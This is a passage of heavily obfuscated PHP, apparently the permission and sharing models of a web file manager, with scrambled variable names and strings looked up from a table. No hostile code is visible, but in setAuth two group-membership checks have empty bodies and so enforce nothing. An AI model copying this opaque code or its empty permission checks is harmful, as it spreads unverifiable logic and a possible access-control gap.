$òÇ”±ú›[$¤™ş£ü[1577]], $¤™ş£ü[402] => $òÇ”±ú›[$¤™ş£ü[402]], $¤™ş£ü[468] => $òÇ”±ú›[$¤™ş£ü[468]], $¤™ş£ü[1680] => USER_ID, $¤™ş£ü[33] => $òÇ”±ú›[$¤™ş£ü[33]], $¤™ş£ü[453] => $òÇ”±ú›[$¤™ş£ü[453]]); return Model($¤™ş£ü[2017])->add($˜Ğ£»õ); } public function reportList($¥Ì¹ü·) { $ÓÖêíö¤ =& $_SERVER[³·—™¤¢]; $õÏËıÍ× = array(); if ($¥Ì¹ü·[$ÓÖêíö¤[781]]) { $éß¬‘´ä = $¥Ì¹ü·[$ÓÖêíö¤[497]] ? $¥Ì¹ü·[$ÓÖêíö¤[497]] : strtotime(date($ÓÖêíö¤[2019])); $õÏËıÍ×[$ÓÖêíö¤[200]] = array($ÓÖêíö¤[333], array($¥Ì¹ü·[$ÓÖêíö¤[781]], $éß¬‘´ä)); } if (isset($¥Ì¹ü·[$ÓÖêíö¤[33]]) && in_array($¥Ì¹ü·[$ÓÖêíö¤[33]], array($ÓÖêíö¤[88], $ÓÖêíö¤[437], $ÓÖêíö¤[2022], $ÓÖêíö¤[2023], $ÓÖêíö¤[2024]))) { $õÏËıÍ×[$ÓÖêíö¤[33]] = $¥Ì¹ü·[$ÓÖêíö¤[33]]; } if (isset($¥Ì¹ü·[$ÓÖêíö¤[770]]) && in_array($¥Ì¹ü·[$ÓÖêíö¤[770]], array($ÓÖêíö¤[197], $ÓÖêíö¤[88], $ÓÖêíö¤[437], $ÓÖêíö¤[2022]))) { $õÏËıÍ×[$ÓÖêíö¤[770]] = $¥Ì¹ü·[$ÓÖêíö¤[770]]; } $Ş¹Â¦ù® = Input::get($ÓÖêíö¤[458], $ÓÖêíö¤[7], $ÓÖêíö¤[2021], array($ÓÖêíö¤[1943], $ÓÖêíö¤[452])); $«´ªÂãø = array($ÓÖêíö¤[450] => $ÓÖêíö¤[451], $ÓÖêíö¤[452] => $ÓÖêíö¤[453]); $æÖ¬¼µ = $ÓÖêíö¤[2025] . $«´ªÂãø[$Ş¹Â¦ù®]; $™ÑÄí¥† = Model($ÓÖêíö¤[2017])->where($õÏËıÍ×)->order($æÖ¬¼µ)->selectPage(20); if (empty($™ÑÄí¥†[$ÓÖêíö¤[369]])) { return array(); } $©ŸòÀıó = array_to_keyvalue_group($™ÑÄí¥†[$ÓÖêíö¤[369]], $ÓÖêíö¤[770], $ÓÖêíö¤[489]); if (!empty($©ŸòÀıó[0])) { $¥Ì¹ü· = $©ŸòÀıó[0]; $õÏËıÍ× = array($ÓÖêíö¤[489] => array($ÓÖêíö¤[7], $¥Ì¹ü·)); $†àœø = $this->where($õÏËıÍ×)->field($ÓÖêíö¤[489])->select(); $†àœø = array_to_keyvalue($†àœø, $ÓÖêíö¤[12], $ÓÖêíö¤[489]); $‘­âî²› = array_diff($¥Ì¹ü·, $†àœø); if (!empty($‘­âî²›)) { foreach ($™ÑÄí¥†[$ÓÖêíö¤[369]] as $øõï¾à¯ => $Ñšå¬¤Î) { if (in_array($Ñšå¬¤Î[$ÓÖêíö¤[489]], $‘­âî²›)) { unset($™ÑÄí¥†[$ÓÖêíö¤[369]][$øõï¾à¯]); } } } } $this->_listDataApply($™ÑÄí¥†[$ÓÖêíö¤[369]]); return $™ÑÄí¥†; } public function reportStatus($¹¶Ÿ¿®ñ) { $èüÈÚùë =& $_SERVER[³·—™¤¢]; $¡æÉ†Ğò = array($èüÈÚùë[399] => $¹¶Ÿ¿®ñ[$èüÈÚùë[399]]); $Û¦Á¦ Ö = Model($èüÈÚùë[2017])->where($¡æÉ†Ğò)->field($èüÈÚùë[2026])->find(); if (!$Û¦Á¦ Ö) { return !1; } $££¨Ã = array($èüÈÚùë[770] => $¹¶Ÿ¿®ñ[$èüÈÚùë[770]]); if ($¹¶Ÿ¿®ñ[$èüÈÚùë[770]] == $èüÈÚùë[2022] && $Û¦Á¦ Ö[$èüÈÚùë[770]] == $èüÈÚùë[2022]) { $££¨Ã[$èüÈÚùë[770]] = 0; } $”ô‚ÖÁË = Model($èüÈÚùë[2017])->where($¡æÉ†Ğò)->save($££¨Ã); if ($¹¶Ÿ¿®ñ[$èüÈÚùë[770]] == $èüÈÚùë[437]) { if ($Û¦Á¦ Ö[$èüÈÚùë[468]] != $èüÈÚùë[197] && $this->shareFileMeta($Û¦Á¦ Ö[$èüÈÚùë[468]])) { $this->shareFileMeta($Û¦Á¦ Ö[$èüÈÚùë[468]], 0); } $this->remove($Û¦Á¦ Ö[$èüÈÚùë[489]]); return !0; } if ($”ô‚ÖÁË && $¹¶Ÿ¿®ñ[$èüÈÚùë[770]] == $èüÈÚùë[2022]) { $ô²Ãß¶² = $££¨Ã[$èüÈÚùë[770]] == $èüÈÚùë[2022] ? 1 : 0; $this->shareFileMeta($Û¦Á¦ Ö[$èüÈÚùë[468]], $ô²Ãß¶²); $this->removeByFile($Û¦Á¦ Ö[$èüÈÚùë[468]]); } return $”ô‚ÖÁË; } private function removeByFile($Æ†ìĞ«) { $Öêß¢‰„ =& $_SERVER[³·—™¤¢]; $ş»Ú¥š  = Model($Öêß¢‰„[845])->where(array($Öêß¢‰„[468] => $Æ†ìĞ«))->field($Öêß¢‰„[402])->select(); $½ÖÒÆİê = array_to_keyvalue($ş»Ú¥š , $Öêß¢‰„[12], $Öêß¢‰„[402]); $×Û„ı·« = array($Öêß¢‰„[402] => array($Öêß¢‰„[7], $½ÖÒÆİê), $Öêß¢‰„[494] => 1); $ş»Ú¥š  = $this->where($×Û„ı·«)->field($Öêß¢‰„[489])->select(); if (empty($ş»Ú¥š )) { return; } $¯äÚ­ÚÒ = array_to_keyvalue($ş»Ú¥š , $Öêß¢‰„[12], $Öêß¢‰„[489]); $this->remove($¯äÚ­ÚÒ); } private function shareFileMeta($¾®Ç°Á„, $‚–ªÔ¡Â = null) { $´±°–‹ =& $_SERVER[³·—™¤¢]; $ß ŠÁÆä = array($´±°–‹[468] => $¾®Ç°Á„, $´±°–‹[94] => $´±°–‹[2027]); if (is_null($‚–ªÔ¡Â)) { return Model($´±°–‹[2028])->where($ß ŠÁÆä)->find(); } $ß ŠÁÆä[$´±°–‹[374]] = $‚–ªÔ¡Â; Model($´±°–‹[2028])->add($ß ŠÁÆä, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\x72\x63\x65\x5f\x61\165\x74\x68"; public function getAuth($Ç¼°Ç£) { $Î÷Ã´»‰ =& $_SERVER[³·—™¤¢]; $ÒÈö¢ = $this->sourceAuthSelect($Ç¼°Ç£); $ÄÀê­ğÒ = array(); $ƒç×§ªî = array(); $Ô©ïÕû = 2 << 25; foreach ($ÒÈö¢ as $òêÀß‰Ê) { $åØ”êçÒ = Model($Î÷Ã´»‰[507])->listData($òêÀß‰Ê[$Î÷Ã´»‰[1956]]); if (!$åØ”êçÒ) { continue; } $ÄÀê­ğÒ[] = $òêÀß‰Ê; $ü‚íŞ†½ = 0; if ($òêÀß‰Ê[$Î÷Ã´»‰[411]] == SourceModel::TYPE_GROUP) { $ü‚íŞ†½ = $Ô©ïÕû * 2; } if ($òêÀß‰Ê[$Î÷Ã´»‰[411]] == SourceModel::TYPE_USER) { $ü‚íŞ†½ = $Ô©ïÕû; } if ($òêÀß‰Ê[$Î÷Ã´»‰[411]] == SourceModel::TYPE_USER && $òêÀß‰Ê[$Î÷Ã´»‰[505]] == $Î÷Ã´»‰[197]) { $ü‚íŞ†½ = 0; } $ƒç×§ªî[] = $åØ”êçÒ[$Î÷Ã´»‰[413]] + $ü‚íŞ†½; } array_multisort($ƒç×§ªî, SORT_DESC, $ÄÀê­ğÒ); return $ÄÀê­ğÒ; } public function sourceAuthSelect($¦âöÄÏ‹) { $Ô·‡Ñœô =& $_SERVER[³·—™¤¢]; static $î·†ÄĞ¯ = array(); $ÛôŠã¬Ù = is_array($¦âöÄÏ‹) ? !1 : !0; if ($ÛôŠã¬Ù) { $¦âöÄÏ‹ = array($¦âöÄÏ‹); } $«˜íö®« = array(); foreach ($¦âöÄÏ‹ as $®µ³ÎúÂ) { if (isset($î·†ÄĞ¯[$®µ³ÎúÂ])) { $«˜íö®«[$®µ³ÎúÂ] = $î·†ÄĞ¯[$®µ³ÎúÂ]; } } if (count($«˜íö®«) == count($¦âöÄÏ‹)) { return $ÛôŠã¬Ù ? $«˜íö®«[$¦âöÄÏ‹[0]] : $«˜íö®«; } $³şîÕÉ = $Ô·‡Ñœô[2029]; $åö“ùó = array($Ô·‡Ñœô[402] => array($Ô·‡Ñœô[7], $¦âöÄÏ‹)); $ù¤ë¿óş = $this->field($³şîÕÉ)->order($Ô·‡Ñœô[399])->where($åö“ùó)->select(); $à–Ò¡ªÈ = array_to_keyvalue_group($ù¤ë¿óş, $Ô·‡Ñœô[402]); foreach ($¦âöÄÏ‹ as $®µ³ÎúÂ) { $î·†ÄĞ¯[$®µ³ÎúÂ] = $à–Ò¡ªÈ[$®µ³ÎúÂ] ? $à–Ò¡ªÈ[$®µ³ÎúÂ] : array(); } if ($ÛôŠã¬Ù) { return $ù¤ë¿óş; } return $à–Ò¡ªÈ; } public function setAuth($¾ ¦Ş‡ì, $­Œ×¯´) { $Ş„ş¬Õ¤ =& $_SERVER[³·—™¤¢]; $÷¶»•¬â = Model($Ş„ş¬Õ¤[1350])->sourceInfo($¾ ¦Ş‡ì); if (!$÷¶»•¬â) { return !1; } if ($÷¶»•¬â[$Ş„ş¬Õ¤[411]] != SourceModel::TYPE_GROUP) { return !1; } $÷°½¡¥™ = 1; $ÉÉè»©× = $÷¶»•¬â[$Ş„ş¬Õ¤[505]]; if ($ÉÉè»©× != $÷°½¡¥™) { $‹¾Íˆ¾ß = array($Ş„ş¬Õ¤[1852] => $ÉÉè»©×); $é¿½û° = Model($Ş„ş¬Õ¤[1942])->field($Ş„ş¬Õ¤[1680])->where($‹¾Íˆ¾ß)->select(); $é¿½û° = array_to_keyvalue($é¿½û°, $Ş„ş¬Õ¤[12], $Ş„ş¬Õ¤[1680]); } $À¦™äÀÜ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $‹¦Ï… = array(); foreach ($­Œ×¯´ as $‚£¡‰¡) { if (!in_array($‚£¡‰¡[$Ş„ş¬Õ¤[411]], $À¦™äÀÜ)) { show_json(LNG($Ş„ş¬Õ¤[2030]), !1); } if ($ÉÉè»©× != $÷°½¡¥™) { if ($‚£¡‰¡[$Ş„ş¬Õ¤[411]] == SourceModel::TYPE_GROUP) { } if ($‚£¡‰¡[$Ş„ş¬Õ¤[505]] != 0 && !in_array($‚£¡‰¡[$Ş„ş¬Õ¤[505]], $é¿½û°)) { } } if ($‚£¡‰¡[$Ş„ş¬Õ¤[505]] == 0) { $‚£¡‰¡[$Ş„ş¬Õ¤[411]] = SourceModel::TYPE_USER; } $‹¦Ï…[] = array($Ş„ş¬Õ¤[402] => $¾ ¦Ş‡ì, $Ş„ş¬Õ¤[411] => intval($‚£¡‰¡[$Ş„ş¬Õ¤[411]]), $Ş„ş¬Õ¤[505] => intval($‚£¡‰¡[$Ş„ş¬Õ¤[505]]), $Ş„ş¬Õ¤[1956] => intval($‚£¡‰¡[$Ş„ş¬Õ¤[1956]]) ? intval($‚£¡‰¡[$Ş„ş¬Õ¤[1956]]) : 0, $Ş„ş¬Õ¤[2012] => intval($‚£¡‰¡[$Ş„ş¬Õ¤[2012]]) ? intval($‚£¡‰¡[$Ş„ş¬Õ¤[2012]]) : -1); } $this->where(array($Ş„ş¬Õ¤[417] => $¾ ¦Ş‡ì))->delete(); $this->addAll($‹¦Ï…); return !0; } public function authClear($˜ÜÓµ) { $‡ÛÙá¯“ =& $_SERVER[³·—™¤¢]; $ÎÛ×åŞŸ = Model($‡ÛÙá¯“[1350])->sourceInfo($˜ÜÓµ); $İÚ¼•± = array($˜ÜÓµ); if ($ÎÛ×åŞŸ[$‡ÛÙá¯“[410]] == $‡ÛÙá¯“[88]) { $ú‚Š•ôë = array($‡ÛÙá¯“[590] => array($‡ÛÙá¯“[550], $ÎÛ×åŞŸ[$‡ÛÙá¯“[521]] . $˜ÜÓµ . $‡ÛÙá¯“[551])); $İÚ¼•± = Model($‡ÛÙá¯“[1350])->field($‡ÛÙá¯“[417])->where($ú‚Š•ôë)->getField($‡ÛÙá¯“[402], !0); $İÚ¼•±[] = $˜ÜÓµ; } $this->where(array($‡ÛÙá¯“[417] => array($‡ÛÙá¯“[418], $İÚ¼•±)))->delete(); return !0; } public function getAllChildren($óîúáòá) { $¹×ÎøØ =& $_SERVER[³·—™¤¢]; $¼ê—§Í— = Model($¹×ÎøØ[1350])->sourceInfo($óîúáòá); if ($¼ê—§Í—[$¹×ÎøØ[410]] != $¹×ÎøØ[88]) { return $this->sourceListAuth(array($óîúáòá)); } if ($¼ê—§Í—[$¹×ÎøØ[411]] != SourceModel::TYPE_GROUP) { return array(); } $ ø©¬“Î = 1; $Ï•ù“Ï¸ = array($óîúáòá); if ($¼ê—§Í—[$¹×ÎøØ[432]] == $¹×ÎøØ[197] && $¼ê—§Í—[$¹×ÎøØ[505]] != $ ø©¬“Î) { $Ï•ù“Ï¸ = $this->groupChidldAllRootSource($¼ê—§Í—[$¹×ÎøØ[505]]); } $½ì¤öØ­ = $this->field($¹×ÎøØ[402])->group($¹×ÎøØ[402])->select(); $½ì¤öØ­ = array_to_keyvalue($½ì¤öØ­, $¹×ÎøØ[12], $¹×ÎøØ[402]); if (!$½ì¤öØ­) { return array(); } $¿ëµ…ôÎ = $¹×ÎøØ[2031]; $ò°Õ‡Øø = array($¹×ÎøØ[402] => array($¹×ÎøØ[7], $½ì¤öØ­), $¹×ÎøØ[431] => $¹×ÎøØ[197]); $ëÅÀü¿› = Model($¹×ÎøØ[845])->field($¿ëµ…ôÎ)->where($ò°Õ‡Øø)->select(); $º”®Ø­Ñ = array($óîúáòá); foreach ($ëÅÀü¿› as $ÖÑîøĞÓ) { foreach ($Ï•ù“Ï¸ as $‡ˆÚß¹‰) { $Ì¼—¥İ‹ = $¹×ÎøØ[50] . $‡ˆÚß¹‰ . $¹×ÎøØ[50]; $‰ªï¿òÎ = $ÖÑîøĞÓ[$¹×ÎøØ[521]] . $ÖÑîøĞÓ[$¹×ÎøØ[402]] . $¹×ÎøØ[50]; if (strstr($‰ªï¿òÎ, $Ì¼—¥İ‹)) { $º”®Ø­Ñ[] = $ÖÑîøĞÓ[$¹×ÎøØ[402]]; break; } } } return $this->sourceListAuth($º”®Ø­Ñ); } private function sourceListAuth($Á€½¦Ö©) { $ø¨Šƒø¸ =& $_SERVER[³·—™¤¢]; $¦‚ş¶ã = Model($ø¨Šƒø¸[1350])->sourceListInfo($Á€½¦Ö©, !0); $Ğ‚íıÁ† = $this->sourceAuthSelect($Á€½¦Ö©); $ñ½Àô¸È = array(); $àó…¢ª£ = array(); foreach ($¦‚ş¶ã as $â×ƒßÏô) { unset($â×ƒßÏô[$ø¨Šƒø¸[456]]); unset($â×ƒßÏô[$ø¨Šƒø¸[454]]); unset($â×ƒßÏô[$ø¨Šƒø¸[413]]); unset($â×ƒßÏô[$ø¨Šƒø¸[86]]); $•µÆöğ– = $Ğ‚íıÁ†[$â×ƒßÏô[$ø¨Šƒø¸[402]]]; if (!$•µÆöğ–) { continue; } $â×ƒßÏô[$ø¨Šƒø¸[2032]] = $this->authTargetInfo($•µÆöğ–); $â×ƒßÏô[$ø¨Šƒø¸[519]] = rtrim($â×ƒßÏô[$ø¨Šƒø¸[525]], $ø¨Šƒø¸[8]) . $ø¨Šƒø¸[8] . ltrim($â×ƒßÏô[$ø¨Šƒø¸[519]], $ø¨Šƒø¸[8]); $ñ½Àô¸È[] = $â×ƒßÏô; $ş±¤™ò® = count(explode($ø¨Šƒø¸[8], trim($â×ƒßÏô[$ø¨Šƒø¸[519]], $ø¨Šƒø¸[8]))); $àó…¢ª£[] = $ş±¤™ò® + ($â×ƒßÏô[$ø¨Šƒø¸[33]] == $ø¨Šƒø¸[75] ? 0 : 1000); } array_multisort($àó…¢ª£, SORT_ASC, $ñ½Àô¸È); return $ñ½Àô¸È; } private function groupChidldAllRootSource($ÛÊÌÊÀ) { $šÃµ­Ã =& $_SERVER[³·—™¤¢]; $çŸ„Úï´ = Model($šÃµ­Ã[2033])->groupChildrenAll($ÛÊÌÊÀ); $¨©ˆ‰Ç = array($šÃµ­Ã[432] => 0, $šÃµ­Ã[505] => array($šÃµ­Ã[7], $çŸ„Úï´), $šÃµ­Ã[411] => SourceModel::TYPE_GROUP); $«‘Æé¾é = Model($šÃµ­Ã[845])->field($šÃµ­Ã[402])->where($¨©ˆ‰Ç)->select(); $«‘Æé¾é = array_to_keyvalue($«‘Æé¾é, $šÃµ­Ã[12], $šÃµ­Ã[402]); return $«‘Æé¾é; } private function authTargetInfo($ŞÅ‹Æ) { $öİ«€  =& $_SERVER[³·—™¤¢]; $Ç‰ä¶‰ = array(); $Øñ„ôŞ = array(); $Ÿ¹¨çê = 2 << 25; foreach ($ŞÅ‹Æ as $çûâÉ¨Ì) { $ÆıÈÉğì = Model($öİ«€ [507])->listData($çûâÉ¨Ì[$öİ«€ [1956]]); if (!$ÆıÈÉğì) { continue; } if ($çûâÉ¨Ì[$öİ«€ [411]] == SourceModel::TYPE_USER) { $Ã¸Ìò© = Model($öİ«€ [513])->getInfoSimpleOuter($çûâÉ¨Ì[$öİ«€ [505]]); if ($Ã¸Ìò©[$öİ«€ [1680]] == $öİ«€ [1213]) { continue; } if ($Ã¸Ìò©[$öİ«€ [1680]] == $öİ«€ [197]) { $Ã¸Ìò©[$öİ«€ [32]] = LNG($öİ«€ [2034]); } } else { $Ã¸Ìò© = Model($öİ«€ [522])->getInfoSimple($çûâÉ¨Ì[$öİ«€ [505]]); } if (!$Ã¸Ìò©) { continue; } $Ã¸Ìò©[$öİ«€ [467]] = $ÆıÈÉğì; $Ç‰ä¶‰[] = $Ã¸Ìò©; $Æ¢Ú„şİ = 0; if ($çûâÉ¨Ì[$öİ«€ [411]] == SourceModel::TYPE_GROUP) { $Æ¢Ú„şİ = $Ÿ¹¨çê * 2; } if ($çûâÉ¨Ì[$öİ«€ [411]] == SourceModel::TYPE_USER) { $Æ¢Ú„şİ = $Ÿ¹¨çê; } if ($çûâÉ¨Ì[$öİ«€ [411]] == SourceModel::TYPE_USER && $çûâÉ¨Ì[$öİ«€ [505]] == $öİ«€ [197]) { $Æ¢Ú„şİ = 0; } $Øñ„ôŞ[] = $ÆıÈÉğì[$öİ«€ [413]] + $Æ¢Ú„şİ; } array_multisort($Øñ„ôŞ, SORT_DESC, $Ç‰ä¶‰); return $Ç‰ä¶‰; } public function getAllChildrenByUser($ š³·âÉ, $â€”¢Ê) { $êÓÎëÈ =& $_SERVER[³·—™¤¢]; $ú«ßÄ× = Model($êÓÎëÈ[535])->getInfo($â€”¢Ê); if (!$â€”¢Ê || !$ š³·âÉ || !$ú«ßÄ×) { return array(); } $®·Œ­Œ‰ = Model($êÓÎëÈ[1350])->sourceInfo($ š³·âÉ); $è²”»ò¥ = array(); $Å¾…ªå¦ = 1; if ($®·Œ­Œ‰[$êÓÎëÈ[432]] == $êÓÎëÈ[197] && $®·Œ­Œ‰[$êÓÎëÈ[505]] != $Å¾…ªå¦ && $this->groupContainUser($®·Œ­Œ‰[$êÓÎëÈ[505]], $â€”¢Ê)) { foreach ($ú«ßÄ×[$êÓÎëÈ[2035]] as $û¥àæî×) { $Ÿ¨Éìâ™ = Model($êÓÎëÈ[522])->getInfo($û¥àæî×[$êÓÎëÈ[1852]]); $±êÒ×Â© = Model($êÓÎëÈ[535])->getInfoSimpleOuter($â€”¢Ê); $±êÒ×Â©[$êÓÎëÈ[467]] = $û¥àæî×[$êÓÎëÈ[413]]; if (Model($êÓÎëÈ[507])->authCheckAction($û¥àæî×[$êÓÎëÈ[413]][$êÓÎëÈ[413]], $êÓÎëÈ[1873])) { continue; } $Äô…Ï“˜ = array($êÓÎëÈ[32] => $êÓÎëÈ[1628] . $Ÿ¨Éìâ™[$êÓÎëÈ[32]], $êÓÎëÈ[402] => $Ÿ¨Éìâ™[$êÓÎëÈ[86]][$êÓÎëÈ[402]], $êÓÎëÈ[84] => KodIO::make($Ÿ¨Éìâ™[$êÓÎëÈ[86]][$êÓÎëÈ[402]]), $êÓÎëÈ[432] => $êÓÎëÈ[197], $êÓÎëÈ[411] => $êÓÎëÈ[515], $êÓÎëÈ[33] => $êÓÎëÈ[554], $êÓÎëÈ[519] => $Ÿ¨Éìâ™[$êÓÎëÈ[526]], $êÓÎëÈ[1852] => $Ÿ¨Éìâ™[$êÓÎëÈ[1852]], $êÓÎëÈ[523] => $Ÿ¨Éìâ™[$êÓÎëÈ[432]], $êÓÎëÈ[2032] => array($±êÒ×Â©)); $è²”»ò¥[$Äô…Ï“˜[$êÓÎëÈ[402]]] = $Äô…Ï“˜; } } $‹¡‰×â¥ = array(); $™¼®ø¿ı = $this->getAllChildren($ š³·âÉ); foreach ($™¼®ø¿ı as $—÷‹ÚÄß) { $²ğã×–É = !1; foreach ($—÷‹ÚÄß[$êÓÎëÈ[2032]] as $¬†¢ÑÁ») { if ($¬†¢ÑÁ»[$êÓÎëÈ[1680]]) { if ($¬†¢ÑÁ»[$êÓÎëÈ[1680]] == $â€”¢Ê) { $²ğã×–É = !0; break; } } if ($¬†¢ÑÁ»[$êÓÎëÈ[1852]]) { if ($this->groupContainUser($¬†¢ÑÁ»[$êÓÎëÈ[1852]], $â€”¢Ê)) { $²ğã×–É = !0; break; } } } if ($²ğã×–É) { $‹¡‰×â¥[] = $—÷‹ÚÄß; } $Åˆ¨©Ü = $—÷‹ÚÄß[$êÓÎëÈ[402]]; if (isset($è²”»ò¥[$Åˆ¨©Ü])) { $—÷‹ÚÄß[$êÓÎëÈ[2032]][] = $è²”»ò¥[$Åˆ¨©Ü][0]; $è²”»ò¥[$Åˆ¨©Ü] = !1; } } $è²”»ò¥ = array_filter(array_values($è²”»ò¥)); $‹¡‰×â¥ = array_merge($è²”»ò¥, $‹¡‰×â¥); return $‹¡‰×â¥; } public function setAllChildrenByUser($ëÅÃà¡Õ, $Ôç¿§×ß, $øùüÅ†ı) { $ÅãÍ³… =& $_SERVER[³·—™¤¢]; $¤ˆåÖúô = $this->getAllChildrenByUser($ëÅÃà¡Õ, $Ôç¿§×ß); if (!$øùüÅ†ı || !$¤ˆåÖúô) { return !1; } foreach ($¤ˆåÖúô as $ÂÎîåÎ) { $ûæøÍ”ˆ = array(); foreach ($ÂÎîåÎ[$ÅãÍ³…[2032]] as $š°ßû´œ) { $€´îÈ† = $š°ßû´œ[$ÅãÍ³…[467]]; $ÕĞ¹«ŞÇ = $š°ßû´œ[$ÅãÍ³…[1680]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ğÇë•ø = $š°ßû´œ[$ÅãÍ³…[1680]] ? $š°ßû´œ[$ÅãÍ³…[1680]] : $š°ßû´œ[$ÅãÍ³…[1852]]; if ($š°ßû´œ[$ÅãÍ³…[1680]] && $š°ßû´œ[$ÅãÍ³…[1680]] == $Ôç¿§×ß) { continue; } $ûæøÍ”ˆ[] = array($ÅãÍ³…[402] => $ÂÎîåÎ[$ÅãÍ³…[402]], $ÅãÍ³…[411] => $ÕĞ¹«ŞÇ, $ÅãÍ³…[505] => intval($ğÇë•ø), $ÅãÍ³…[1956] => isset($€´îÈ†[$ÅãÍ³…[399]]) ? intval($€´îÈ†[$ÅãÍ³…[399]]) : 0, $ÅãÍ³…[2012] => isset($€´îÈ†[$ÅãÍ³…[2012]]) ? intval($€´îÈ†[$ÅãÍ³…[2012]]) : -1); } $ûæøÍ”ˆ[] = array($ÅãÍ³…[402] => $ÂÎîåÎ[$ÅãÍ³…[402]], $ÅãÍ³…[411] => SourceModel::TYPE_USER, $ÅãÍ³…[505] => intval($Ôç¿§×ß), $ÅãÍ³…[1956] => intval($øùüÅ†ı), $ÅãÍ³…[2012] => -1); $this->where(array($ÅãÍ³…[417] => $ÂÎîåÎ[$ÅãÍ³…[402]]))->delete(); $this->addAll($ûæøÍ”ˆ); } return !0; } public function get($ƒ˜Äõ´ñ) { $æãß®Èæ = $this->getSourceList(array($ƒ˜Äõ´ñ), !0); return $æãß®Èæ[0]; } public function getSourceList($äùèéñÙ, $ˆ‚ç¢–É = false, $ßˆ‹«Ü¶ = false) { $´„Æãş¬ =& $_SERVER[³·—™¤¢]; if (!$äùèéñÙ) { return array(); } $€åÈôĞã = Model($´„Æãş¬[1350]); if (!$ˆ‚ç¢–É && count($äùèéñÙ) == 1) { $ˆ‚ç¢–É = array(); $ˆ‚ç¢–É[$äùèéñÙ[0]] = $€åÈôĞã->sourceInfo($äùèéñÙ[0]); } if (!$ˆ‚ç¢–É) { $íÁÄ…Î½ = array($´„Æãş¬[417] => array($´„Æãş¬[418], $äùèéñÙ)); $ˆ‚ç¢–É = $€åÈôĞã->field($´„Æãş¬[2036])->where($íÁÄ…Î½)->select(); $ˆ‚ç¢–É = array_to_keyvalue($ˆ‚ç¢–É, $´„Æãş¬[402]); } $€·ÉÖ‘« = $äùèéñÙ; foreach ($ˆ‚ç¢–É as $Ó…ßş¹Ú => $˜Â×µÚê) { $ÌıŸ°¥ˆ = $€åÈôĞã->parentLevelArray($˜Â×µÚê[$´„Æãş¬[521]]); $€·ÉÖ‘« = array_merge($€·ÉÖ‘«, array($Ó…ßş¹Ú), array_reverse($ÌıŸ°¥ˆ)); } $€·ÉÖ‘« = array_values(array_unique($€·ÉÖ‘«)); if (!$€·ÉÖ‘«) { return array(); } $ö„¢Õ¥  = $this->sourceAuthSelect($€·ÉÖ‘«); $˜ê¤¿ê = array(); foreach ($€·ÉÖ‘« as $ıÉŞôšê) { if (isset($ö„¢Õ¥ [$ıÉŞôšê])) { $˜ê¤¿ê[$ıÉŞôšê] = $ö„¢Õ¥ [$ıÉŞôšê]; } } $üêªß¸ = $this->userIsRoot($ßˆ‹«Ü¶); $©òËÏä = AuthModel::authAll(); $“š®ÑŒØ = array($´„Æãş¬[414] => $©òËÏä, $´„Æãş¬[2037] => array($´„Æãş¬[419] => 0, $´„Æãş¬[1858] => $©òËÏä, $´„Æãş¬[420] => LNG($´„Æãş¬[2038]), $´„Æãş¬[1875] => $´„Æãş¬[2039])); $øùÉˆĞğ = array(); foreach ($ˆ‚ç¢–É as $ıÉŞôšê => $ÕšçÚ«) { if ($üêªß¸ && $GLOBALS[$´„Æãş¬[6]][$´„Æãş¬[1871]]) { $øùÉˆĞğ[$ıÉŞôšê] = $“š®ÑŒØ; continue; } $øùÉˆĞğ[$ıÉŞôšê] = $this->makeSourceAuth($ÕšçÚ«, $˜ê¤¿ê, $ßˆ‹«Ü¶); } return $øùÉˆĞğ; } public function authDeepCheck($¡´şÎé, $÷ë‰ä˜Ô = false) { $ÂáğÄ¬ =& $_SERVER[³·—™¤¢]; $÷ë‰ä˜Ô = $÷ë‰ä˜Ô ? $÷ë‰ä˜Ô : USER_ID; $êé—Öå¶ = $this->makeAuthDeep($÷ë‰ä˜Ô); if (!in_array($¡´şÎé, $êé—Öå¶[$ÂáğÄ¬[2040]])) { return !1; } $ëí£è” = array(); foreach ($êé—Öå¶[$ÂáğÄ¬[2041]] as $ûË©¦¿ => $¥ù¦Õ—Š) { if (!in_array($¡´şÎé, $¥ù¦Õ—Š)) { continue; } $ëí£è”[] = $ûË©¦¿; } if (!$ëí£è”) { return !1; } $¹Ôµç×¢ = $ëí£è” ? $ëí£è”[0] : $¡´şÎé; return array($ÂáğÄ¬[414] => -1, $ÂáğÄ¬[467] => array($ÂáğÄ¬[419] => $ÂáğÄ¬[1213], $ÂáğÄ¬[1858] => $ÂáğÄ¬[197], $ÂáğÄ¬[420] => LNG($ÂáğÄ¬[2042]), $ÂáğÄ¬[1875] => $ÂáğÄ¬[2043]), $ÂáğÄ¬[2044] => LNG($ÂáğÄ¬[2045]), $ÂáğÄ¬[2046] => $this->sourceAuthInfo($¹Ôµç×¢)); } protected function makeAuthDeep($©“ª±Ì = false) { $Ç†—ÔÆ =& $_SERVER[³·—™¤¢]; static $ó÷Ä€ëŠ = array(); $©“ª±Ì = $©“ª±Ì ? $©“ª±Ì : USER_ID; if (isset($ó÷Ä€ëŠ[$©“ª±Ì])) { return $ó÷Ä€ëŠ[$©“ª±Ì]; } $»áãÊ¡š = Model($Ç†—ÔÆ[2047])->listData(); $¡ïİ²İÆ = array(); foreach ($»áãÊ¡š as $µÇ‡Ï) { if ($µÇ‡Ï[$Ç†—ÔÆ[413]] == 0 && $µÇ‡Ï[$Ç†—ÔÆ[1874]] == $Ç†—ÔÆ[88]) { $¡ïİ²İÆ[] = $µÇ‡Ï[$Ç†—ÔÆ[399]]; } } $Ì©±ãÉÜ = $this->userGroupParents($©“ª±Ì); $ˆÍá¤ã‘ = array($Ç†—ÔÆ[411] => SourceModel::TYPE_USER, $Ç†—ÔÆ[505] => $©“ª±Ì); if ($Ì©±ãÉÜ) { $ˆÍá¤ã‘ = array(array($Ç†—ÔÆ[411] => SourceModel::TYPE_USER, $Ç†—ÔÆ[505] => $©“ª±Ì), array($Ç†—ÔÆ[411] => SourceModel::TYPE_GROUP, $Ç†—ÔÆ[505] => array($Ç†—ÔÆ[418], $Ì©±ãÉÜ)), $Ç†—ÔÆ[1023] => $Ç†—ÔÆ[1950]); } $ƒ¼¾ˆµÉ = $this->field($Ç†—ÔÆ[2048])->where($ˆÍá¤ã‘)->select(); $Ò¿‰€‰¨ = array(); $›¼§„ãª = array_to_keyvalue_group($ƒ¼¾ˆµÉ, $Ç†—ÔÆ[402]); foreach ($›¼§„ãª as $µ¼³‘ÖÄ => $ÏıÈ¤Úñ) { $º©á¡· = 